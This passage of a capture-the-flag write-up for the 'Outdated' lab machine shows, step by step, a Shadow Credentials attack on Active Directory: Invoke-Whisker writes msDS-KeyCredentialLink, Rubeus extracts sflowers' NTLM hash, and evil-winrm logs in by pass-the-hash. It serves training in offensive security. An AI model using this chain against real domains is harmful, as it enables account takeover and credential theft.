+</span></span><span style="display:flex;"><span>ObjectSID             : S-1-5-21-4089647348-67660539-4016542185-1108
+</span></span><span style="display:flex;"><span>InheritanceFlags      : None
+</span></span><span style="display:flex;"><span>BinaryLength          : 36
+</span></span><span style="display:flex;"><span>IsInherited           : False
+</span></span><span style="display:flex;"><span>IsCallback            : False
+</span></span><span style="display:flex;"><span>PropagationFlags      : None
+</span></span><span style="display:flex;"><span>SecurityIdentifier    : S-1-5-21-4089647348-67660539-4016542185-1107
+</span></span><span style="display:flex;"><span>AccessMask            : 131092
+</span></span><span style="display:flex;"><span>AuditFlags            : None
+</span></span><span style="display:flex;"><span>AceFlags              : None
+</span></span><span style="display:flex;"><span>AceQualifier          : AccessAllowed
+</span></span></code></pre></div><p>It looks like the <code>ITStaff</code> group has <code>WritePropertiy</code> rights on the <code>ms-ds-key-credential-link</code> for the <code>sflowers</code> user. The <code>ms-ds-key-credential-link</code> attribute stores and links raw cryptographic data for password-less authentication to a user or computer object. In order to exploit this, we can use <code>Invoke-Whisker.ps1</code> from <a href="https://github.com/IAMinZoho/OFFSEC-PowerShell/blob/main/Invoke-Whisker.ps1">here</a>. I&rsquo;ll transfer it over via an SMB server using <code>impacket</code></p>
+<p>Once we have it transferred, we can add <code>sflowers</code> as the target</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>PS C:\Users\btables&gt; Invoke-Whisker -command &#34;add /target:sflowers&#34;
+</span></span><span style="display:flex;"><span>Invoke-Whisker -command &#34;add /target:sflowers&#34;
+</span></span><span style="display:flex;"><span>[*] No path was provided. The certificate will be printed as a Base64 blob
+</span></span><span style="display:flex;"><span>[*] No pass was provided. The certificate will be stored with the password 73FBW82PxZbBtWsk
+</span></span><span style="display:flex;"><span>[*] Searching for the target account
+</span></span><span style="display:flex;"><span>[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+</span></span><span style="display:flex;"><span>[*] Generating certificate
+</span></span><span style="display:flex;"><span>[*] Certificate generaged
+</span></span><span style="display:flex;"><span>[*] Generating KeyCredential
+</span></span><span style="display:flex;"><span>[*] KeyCredential generated with DeviceID 24ced287-444a-476c-bd33-a7fe0f5294cb
+</span></span><span style="display:flex;"><span>[*] Updating the msDS-KeyCredentialLink attribute of the target object
+</span></span><span style="display:flex;"><span>[+] Updated the msDS-KeyCredentialLink attribute of the target object
+</span></span><span style="display:flex;"><span>[*] You can now run Rubeus with the following syntax:
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAjcs8AZKSs05AICB9AEggTYPjcfsSp+IOati+KpBTJ1g/IkoOKtrwduzSVePlnwi45ewrt7ez+U+PIi0vpny1X0ggsrGk+xyZF6gML8ugUzQvxvAVvpgaraObKNsjGOa51xdYo8kzCRxphhoG1GUWIM0+Znb2GriBW3kg7JVL6q0sz6mucBqn/zo0T4ApEzeiC9wJu6vGu8rHIGL4SUsFTQdXvOgN+DkFCeeFRH1s7mLbfZ6eEt2EnBdgmNhy6ui36aqURcs9BxA1AYV066IEIN9XJ9V7eGjtsfGVDv0H+T8VYPSgjwO/Bmhv2vXkL50GMcLwErdtb5McfF0VEFJFQybf/BvKpVnobIoT9wGojYxIXOO5OT8pORYdG+U/cr5vEaTbENIiZ+pynn9LlOPDXD8I+A/XIFRdRIhzlNnByeD++NJ+9y3UZF0LNjrYS3+szL0nVETNGJkoulLk82qg/MvxIAICpAyFqeBbCSMlh6YWhriSQOoyvtYLD9Tit2PgCDQRETg5gIhDDjFB8mM0piTjlHqdX01osn3uZgTBQwdOx2qyVAj+51F7AceMi36BHC6wL4M4LdQKpp0JR0FYPe8zqURbKsYPYVSLzIfEdtJm0isvkm2xr33BUZ2A31JpWmIpSAC4WDfYtcbXy3Gn8vwaBjuFEUfQQLtEVtoNpTO59nRlPLIxY5FnndLpIhYzKNRaVWyuLopv5TRXtXMEpmRWmGfBX7LdaeMTuPqAuNWEf/NjaS3LWN+yk3dh9xLGMWevTy7sHp/KjsLuElcTCHc7/dvDyjA8fqsVDdzuUSah33Rry2XZK0iioeh7tiueJPC6l4c0Kxs0Zx3ti9umqGY6fuoNA+ox6yvbvHl1l2/309nHRk+88QHaN/kGNCKbFX3vJKT2FuJOWA2DddAMcQnH4SH6BhO+Hj7Iwn3jhkANw6rqAewd1Gs7NCdC3a79UyT1LA6VE7bcTTygP2bs9bsIZMP/94AJd1hAxEeQuu6ggWXc9AjUfegxJMd1yn5AJ4HM4GipF6LlQ6gLgKF0kQ5DnkJC+6S+si0rPcsOHVWSoLTd0tmkKrMJGjED2qSThSTK5iU4NEsYqatJNZVLhCgml59FlFhfTIgcbhEeEXj+HYcEaqsRB0BuXXY5fy5EDDy2/jHT36RbHCY0e+Kt1FKUsuAdvuLcUdGWkFnfECrTPXwoGJ1G59696BLtEiVQkrai/HrWQzhGDe5UgO6MEbt9+N1VHH9474/3fgFj/dYHfVMMH90Sekk9sMIxreQZk5GBrYUQsk2QijVukoa9KCAYIycoIjUYWxEmcgvQb58mWaqu+bRo8Gdz4PeyRiiTHDTPbl10SqI4cgqKtyBs27j8Yg/jTzRBfbOE7mBopLawAru+sbCLHpZBgQQKtVtjGER/MaDhUk9kwbomoXiBKhxw3ZkWcLtC9Qia98YMbWCvltWFXzuGPT3uTHzlLtjVv15jgZi/2kRkVZRVorzJDFJd2Gkd3yiUK0oPiea22DHF3cUU2kZda+5qJo98JFA+x2k4rztTSfwlIkzuddUnczKG9KuQurVrys/pE2gbYvB5pZ8J1GW22WVwXhhPxAZsnd4Ia9KhbNFI+BSQfV1iNBL70MoXLnsF89jlE2VjK6DRNUW4qG8V+27Vk/oU1wAbFX/aXjgYw9XzGB6TATBgkqhkiG9w0BCRUxBgQEAQAAADBXBgkqhkiG9w0BCRQxSh5IADEAMwA3AGYAMAA4ADMAMAAtADIANwAxAGEALQA0AGEAMgA3AC0AYQBkADkAOQAtADQAMgBhADkAMgBjAGIAZQBmADIAOQAzMHkGCSsGAQQBgjcRATFsHmoATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABSAFMAQQAgAGEAbgBkACAAQQBFAFMAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByMIIDPwYJKoZIhvcNAQcGoIIDMDCCAywCAQAwggMlBgkqhkiG9w0BBwEwHAYKKoZIhvcNAQwBAzAOBAjyPUWbAMMQUgICB9CAggL4+Gy5HrNEYq+aCY/wmDLfIRMR/wATUiNen2Q/yY6tzdY13+t1qIFQBuaSQucxpygDAviUa7fLuWxDyNHk7xLLdDMuD4WbJlQW5PEcfoUzVIrIzkn6vsx/Shbdio5ftZxiFuh+II5HKd4FphI9R0mE459QNGlGWRzE0TwpTSIHpm230at8m/BM9Bp1uEDEI2XN6tHGepadw8JhuorIgifm+qk17txLhb0nwS8xN7MEsLba7TMIeUnt7nqAWUo9PA2R2Js0hdY6RYlRU+sV6uWXH412iyN1TZmOgl9pUfa0WEkGe0TtjJbRo8Cjc2o4Uz6nXvDiLV65S0G27hkLlUZBMXz+jl4zMM9GQQwB6zYor+LKXANP1kGlJ7VSEQJa7tYJL4S+yHBVeIeOsB8J9D6u0wICm1GE0LuV7y4LN6e2iM7OU8ew/YX2qCjE7oJP5q69xM2a3oSlbAogVJM9/00X0YkTA8KxmmOarLGscBS6uAe2POj72C+DYhoBXiYuZUnQPXOT+ILQSWtWl7mX8s6RLTkCUw0XaTSfaZnCoDDps2NCkzVr8459hEVk7Rn5VkDmsBh/Zw1VuevX39hbUKjW+yFUMvh/59Ph9PdrHKwtwNYgQ1aL5CEEG8GLpLayTfkm0uEIQIG6FhPmHkzRL1FPBzqvT1mpbGcBFjcCtP1qrAk55cg+J6GTZ/xDG2cKnyxx1ntqZSeSFYtjUIsnTR7Udhs91I7SI1VXX8iwl8JcwXdmnSv/lZEYntewE4LUjqGTbo3QiffrflboolDcaonnsIMDCWKB17QTKgXhZ8ZIUMZBzeT93esvGUE7Dxp/W3168wS2PzVQWHNDj8WxGaDRkISGmkbYS4k8e/GH87M97SVoKf3TM2Tbr8LpRG++vCPRGaIk7WHxBfFLvpTuPFuGyqhjxt2ZF6g77BR+W3mP9xWf/1JMR48R++gWAStwORKi1fAs509Y5JCqQd6l5sHcama2KdNZbwhpbs7fucbwc9fPbL5UwO7wojA7MB8wBwYFKw4DAhoEFMcGd7mbaa58rQxt4bvZiIWI4Sb9BBRr9gDfICEHkXgmIVxNv99pdM9r9QICB9A= /password:&#34;73FBW82PxZbBtWsk&#34; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+</span></span></code></pre></div><p>Then we need to copy <code>Rubeus</code> over and run the command provided by <code>Invoke-Whisker.ps1</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>PS C:\Users\btables&gt; ./Rubeus.exe asktgt /user:sflowers /certificate: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 /password:&#34;73FBW82PxZbBtWsk&#34; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>   ______        _
+</span></span><span style="display:flex;"><span>  (_____ \      | |
+</span></span><span style="display:flex;"><span>   _____) )_   _| |__  _____ _   _  ___
+</span></span><span style="display:flex;"><span>  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span><span style="display:flex;"><span>  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span><span style="display:flex;"><span>  |_|   |_|____/|____/|_____)____/(___/
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  v2.3.3
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Action: Ask TGT
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers
+</span></span><span style="display:flex;"><span>[*] Building AS-REQ (w/ PKINIT preauth) for: &#39;outdated.htb\sflowers&#39;
+</span></span><span style="display:flex;"><span>[*] Using domain controller: 172.16.20.1:88
+</span></span><span style="display:flex;"><span>[+] TGT request successful!
+</span></span><span style="display:flex;"><span>[*] base64(ticket.kirbi):
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>      doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g
+</span></span><span style="display:flex;"><span>      AwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRio4IEnzCCBJugAwIBEqEDAgECooIEjQSCBIlqSHyX
+</span></span><span style="display:flex;"><span>      2W5MC5rz0dfZc+WgkE3tRN1UVQ3fqNEIH+pMoVFYVLlRugVX93LF9WAApQCJfytO6vSvFiuZUu/CPqma
+</span></span><span style="display:flex;"><span>      RfXwhDqBGcsOAVQMoVc+ekdSoetawrPtEPKjlMtV4x2Q5p0JG8sRcz4qN/tx6/xy0t+rLoYlMVCbeLM4
+</span></span><span style="display:flex;"><span>      qKnwssWbWLBZa1EITrtzWIY3Kk6anhteG1XC3qhYKuBKw6MEevo4T2rO1OPLPIV5aOXGP7a4Cd2/UrVa
+</span></span><span style="display:flex;"><span>      5Ht2XVcY1DjyVEtPdrnw7Hhz7rJ7H6HruYUdvj74VfNxopNn58OBzlI7lmbDryvFQiOwBn4jviaHyrYD
+</span></span><span style="display:flex;"><span>      7UfeGsrBH6BZTXMSGm4TEaIGGrzhPyPTJvQUormFpCURfMUn0nFILMDDcLlXRTEI+aEc6DBWKJx3xHRz
+</span></span><span style="display:flex;"><span>      mPqgA414QyHZwP2VIsCDsbHfLsJNqJHaIEpQq4N+LCEGliqA5rPdbyR1+Tu08Ern3wEXEHwtGFlObxLA
+</span></span><span style="display:flex;"><span>      z+LipkbrRBQVvybd2l6MG4k9W9V3nHbycD+HkZiGTYGHGQ4CekBMKbA18mD0sf5u7gELtc5HS1jg/Lff
+</span></span><span style="display:flex;"><span>      atj7ul1Nx9SLEv+Me1+yTGS+E2HtY99O0DKFCV7NRagfbhp06qR2Tm/8nAvvELuU/XBRK19cJnUhmb7N
+</span></span><span style="display:flex;"><span>      5UHhRsvuwdLuA92sUWXvwoFAIesa/ESbLFx14Q3W47g/4Re1JUgIypWGvOhYMKYumwzhvyfVZe+Eus3u
+</span></span><span style="display:flex;"><span>      QMUJ+IRlnKL5LwrKKMfL14n148Q2BQFWdc5nawF6B6MVi5rpLuXa8I/UTszWStPi0ALwE8ycEin6w0iO
+</span></span><span style="display:flex;"><span>      fU7trXaz3PM19gTEhr5uxNpreEqCCHGzOZjp04qe3hI+LK2bK4QNkWsKjLdVQgzZ2M34dlNjTW4Wx2C7
+</span></span><span style="display:flex;"><span>      2fy99d6O4Xem4Dql3rJIo9Zh8zBuCZrEcUpshkaACtuGRBIivhr5InMJWmdZ1dmjx9bsmqJ29qATcr44
+</span></span><span style="display:flex;"><span>      kGmcHaBoOwxUMyS8knfzXjriBvN47hH4W4LY8X1c9DsU/biH1KbOqV6STQF9nqd0NXEjW8SC53DCvDoz
+</span></span><span style="display:flex;"><span>      1UwN80VsbuBxA/LDk5gW7vEb2uzOhggA2Cx5yM523zTmzCzYc6+AR5RGTuxEwEet456NWfAKu5giKxKp
+</span></span><span style="display:flex;"><span>      OHq5r2fUSPgURgaLSjxQeyuQiQvkcDegyp7syxDlqD2DkYkW/vj/Ee4MPT+VAPh7dGS37T3xAFzM4kca
+</span></span><span style="display:flex;"><span>      BrNAgA+P/qYKNaXknV3KpP7MgAPpIdRFVBUWbeb5WVFtkia1zbAYlzCUi3dzBPRO7lRm7DXjqBEZDpLE
+</span></span><span style="display:flex;"><span>      EAmiboxnImkS4DMAKt/ZU+wVked/N2pXDnERxQCDroZ71pyTzTHJRFLLrqloArCFa09Rm01ChJX9u4ej
+</span></span><span style="display:flex;"><span>      V+ksDJZc1SEHD/92FexYLLVkGMAioBuJ/0xZEgJBGkzNP56fMbxiwPwX9s5KSJpoTl4RJRiRTKIzLHHq
+</span></span><span style="display:flex;"><span>      OXRqo2FhxJfnH8N0kyYUvsIkMSyjv0fzPdqRLGlSt/iYc8weYkodyXx3gabM5Yfc8/AXQcEjbuRxCZD6
+</span></span><span style="display:flex;"><span>      SGxrzC1nUFfVadQVrXUk4xWjgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaAbMBmgAwIBF6ES
+</span></span><span style="display:flex;"><span>      BBA9yCW5mMRCdjZnmn7zRcD0oQ4bDE9VVERBVEVELkhUQqIVMBOgAwIBAaEMMAobCHNmbG93ZXJzowcD
+</span></span><span style="display:flex;"><span>      BQBA4QAApREYDzIwMjUwMzEyMDk1MzIwWqYRGA8yMDI1MDMxMjE5NTMyMFqnERgPMjAyNTAzMTkwOTUz
+</span></span><span style="display:flex;"><span>      MjBaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  ServiceName              :  krbtgt/outdated.htb
+</span></span><span style="display:flex;"><span>  ServiceRealm             :  OUTDATED.HTB
+</span></span><span style="display:flex;"><span>  UserName                 :  sflowers (NT_PRINCIPAL)
+</span></span><span style="display:flex;"><span>  UserRealm                :  OUTDATED.HTB
+</span></span><span style="display:flex;"><span>  StartTime                :  3/12/2025 2:53:20 AM
+</span></span><span style="display:flex;"><span>  EndTime                  :  3/12/2025 12:53:20 PM
+</span></span><span style="display:flex;"><span>  RenewTill                :  3/19/2025 2:53:20 AM
+</span></span><span style="display:flex;"><span>  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+</span></span><span style="display:flex;"><span>  KeyType                  :  rc4_hmac
+</span></span><span style="display:flex;"><span>  Base64(key)              :  PcgluZjEQnY2Z5p+80XA9A==
+</span></span><span style="display:flex;"><span>  ASREP (key)              :  0249B4BE3A267D30030303D92D138911
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Getting credentials using U2U
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  CredentialInfo         :
+</span></span><span style="display:flex;"><span>    Version              : 0
+</span></span><span style="display:flex;"><span>    EncryptionType       : rc4_hmac
+</span></span><span style="display:flex;"><span>    CredentialData       :
+</span></span><span style="display:flex;"><span>      CredentialCount    : 1
+</span></span><span style="display:flex;"><span>       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
+</span></span></code></pre></div><p>And we get the NTLM hash of <code>sflowers</code>! Now we can WinRM in with <code>evil-winrm</code> and grab the user flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.11.175 -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>*Evil-WinRM* PS C:\Users\sflowers&gt; cd Desktop
+</span></span><span style="display:flex;"><span>d*Evil-WinRM* PS C:\Users\sflowers\Desktop&gt;dir
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    Directory: C:\Users\sflowers\Desktop
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----         8/3/2022   4:19 PM         514472 PsExec64.exe
+</span></span><span style="display:flex;"><span>-ar---        3/11/2025   5:08 PM             34 user.txt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>*Evil-WinRM* PS C:\Users\sflowers\Desktop&gt; cat user.txt
+</span></span><span style="display:flex;"><span>6ec5e4a002e6d3105e631fc4f9cbc825
+</span></span></code></pre></div><p>Checking the groups <code>sflowers</code> is a member of shows that she is a member of the <code>WSUS Administrators</code> group</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\sflowers\Desktop&gt; whoami /groups
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Group Name                                  Type             SID                                          Attributes
+</span></span><span style="display:flex;"><span>=========================================== ================ ============================================ ===============================================================
+</span></span><span style="display:flex;"><span>Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>OUTDATED\WSUS Administrators                Alias            S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group
+</span></span><span style="display:flex;"><span>NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+</span></span></code></pre></div><p>If we ran <code>bloodhound</code> from our original session as the <code>btatbles</code> user, we would have identified an attack path. If you run <code>bloodhound</code> from the <code>sflowers</code> user, you won&rsquo;t see this attack path
+<img src="/images/Outdated/path.png" alt="Attack Path"></p>
